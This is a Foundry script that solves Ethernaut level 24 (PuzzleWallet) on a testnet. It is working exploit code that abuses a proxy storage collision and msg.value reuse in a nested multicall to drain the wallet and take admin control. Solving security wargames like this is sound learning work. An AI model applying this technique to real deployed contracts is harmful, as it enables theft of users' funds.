// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

/*
    Solution script for the Ethernaut Level 24: PuzzleWallet

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in PuzzleWalletScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/PuzzleWallet.s.sol:PuzzleWalletScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/PuzzleWallet.s.sol/11155111
*/

interface IWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
    function balances(address holder) external returns(uint256);
}

contract PuzzleWalletScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0x3b850823335167e68c5Fa64cEe71f8D209429E7b);
    IWallet wallet = IWallet(instance);

    function run() external {
        vm.startBroadcast();

        uint256 balance = msg.sender.balance;

        // making ourselves owner of wallet);
        wallet.proposeNewAdmin(msg.sender);
        // whitelisting our address
        wallet.addToWhitelist(msg.sender);

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        // deposit
        data[0] = deposit_data[0];
        // multicall -> deposit
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);


        /* 
            The attack can be broken down as follows:

            1. Need to drain the contract. This is done by calling multicall 
            with a nested a multicall it will trick the contract to update the attacker 
            balance two times each with 0.001 therefore setting it to 0.002
            however, the attacker only actually send a value of 0.001 ether.

            Therefore, the total balance of the contract now will be 0.002, 
            but due to the accounting error in balances, it'll think that it's 0.003 Ether of 
            which it will incorrectly update the attacker balance to 0.002

            2. Now we can call execute on the contract to drain the contract

            3. With the contract balance drained we are able to call setMaxBalance
        */

        wallet.multicall{value: 0.001 ether}(data);

        // check the wallet balances updated accoringly
        require(instance.balance == 0.002 ether, 'wallet ETH baalnce not updated');
        require(wallet.balances(msg.sender) == 0.002 ether, 'player wallet accounting balance not updated');

        // now we can call execute to drain the contract due to the accounting error
        wallet.execute(msg.sender, 0.002 ether, "");
        // calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        
        // if the player is not the admin then the attack has failed
        require(wallet.admin() == msg.sender, "Admin not updated correctly");

        // ensure the player wallet has increased balance
        require(msg.sender.balance > balance, "player balance has not increased");

        vm.stopBroadcast();
    }
}